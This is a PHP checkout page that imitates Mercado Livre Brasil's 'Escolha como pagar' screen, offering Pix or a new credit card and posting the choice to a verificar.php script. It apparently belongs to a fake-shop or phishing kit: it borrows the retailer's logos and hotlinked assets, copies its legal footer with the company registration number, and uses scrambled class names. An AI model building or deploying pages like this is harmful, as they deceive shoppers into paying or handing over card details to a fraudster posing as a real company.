<?php 
session_start();
?>
 <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">	
</head>
<body style="background:rgb(238, 238, 238);">

	<header class="dasdaksldaskdadcoderphp">
		<div class="container">
			<div class="row">
				<div class="col-md-6 col-6">
					<img class="peukaskaks" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt="">
				</div>
				<div class="col-md-6 col-6">
					<p style="font-size:13px;cursor:pointer;position:relative;top:10px;float:right;">Contato</p>
				</div>
			</div>
		</div>
	</header>
	
	<aside>
		<div class="container">
			<br><br>
			 	<h1 style="font-size:1.6em;">Escolha como pagar</h1>
			 <div class="row">

			 			 	 <div class="col-md-8"><br>
			 	 	<div id="container1" class='kdlkdkasdasld' style="cursor:pointer;border-radius:4px;width:100%;height:auto;background:white;padding:30px;">
			 	 
			 	 		
			 	 				<form action="verificar.php" method="post">
			 	 					

		 		 	
<input style="float:left;" type="radio" name="pg" value="pix">
<img  style="width:40px;height:40px;margin-left:10px;position:absolute;margin-top:-13px;float:left;" border="0" height="20px" src="https://www.imagensempng.com.br/wp-content/uploads/2023/06/logo-pix-icone-1024.png" alt="">

<span style="position:absolute;margin-top:-13px;margin-left:60px;float:left;">Pix <br><span style="font-weight:300;font-size:13px;color:rgb(141,141,141)">Aprovação imediata</span></span>




<div style="clear:both;"></div>

			 	 	<p style="font-weight:600;border-top-right-radius:7px;border-bottom-left-radius:7px;text-align: center;position:relative;margin-top:-45px;margin-left:0;margin-right:-30px;font-size:10px;width:100px;height:auto;padding:3px;color:white;float:right;background:rgb(52, 131, 250);">RECOMENDADO</p>	
			
			 	 	
			 	 	</div>


<br>

<div id="container2" class='kdlkdkasdasld' style="cursor:pointer;border-radius:4px;width:100%;height:auto;background:white;padding:30px;">
			 	 
			 	 		
			 	 				
			 	 					

		 		 	
<input name="pg" value="card" style="float:left;" type="radio">
<img  style="width:40px;height:40px;margin-left:10px;position:absolute;margin-top:-13px;float:left;" border="0" height="40px" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_credit_card.svg" alt="">

<span style="position:absolute;margin-top:-4px;margin-left:60px;float:left;">Novo cartão de crédito </span>




<div style="clear:both;"></div>

			 	 
			
			 	 	
			 	 	</div>
<br>



			 	 	<br>
			 	 	<button  style="maring-top:15px !important;" class="buttoncomprar">Continuar</button>


			 	 		</form>
</div>




			 	<div class="col-md-4">
	 <div class="asdlasdaskd92929202020202-22002022">
	 	<p style="font-weight: 600;">Resumo da compra</p>
	 	<hr>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Produtos (<?=$_SESSION['qtdprodutos']?>)</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;">R$ <?= number_format( $_SESSION['totalpreco'], 2, ',', '.');?></span></div>
	 		<div style="clear:both;"></div>
	 	</div><br>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Frete</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;color:#00a650;">Grátis

</span></div>
<div style="clear:both;"></div>
	 	</div>
	 	<hr>
	 	

	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;">Você pagará</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;"><strong>R$ <?= number_format( $_SESSION['totalpreco'], 2, ',', '.');?></strong>

</span></div>
	 	</div>
	 </div>
</div>
	


			 	 </div>
			 </div>
		</div>
	</aside>

<br>

<footer class="aksdkjasdkasdfooter">
	<div class="container">
	<div class="row">
			<nav class="ansnansnansnav">
			<ul>
			<li>Trabalhe conosco
</li>
			<li>Termos e condições</li>
			<li>Promoções</li>
			<li>Como cuidamos da sua privacidade</li>
			<li>Acessibilidade</li>
			<li>Contato</li>
			<li>Informações sobre seguros</li>
			<li>
Programa de Afiliados
</li>
			<li>Black friday</li>

		</ul>
	</nav>
<br>
	<span style="font-size:12px;color:rgb(200,200,200);">Copyright © 1999-2024 Ebazar.com.br LTDA. <br> CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</span>
	</div>
	</div>
</footer>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>	

<script src="https://code.jquery.com/jquery-3.7.1.min.js"
            integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
            crossorigin="anonymous"></script>	
<script>$(document).ready(function() {
  $('.kdlkdkasdasld').on('click', function() {
    $(this).find('input[type="radio"]').prop('checked', true);
  });
});
</script>
</body>
</html>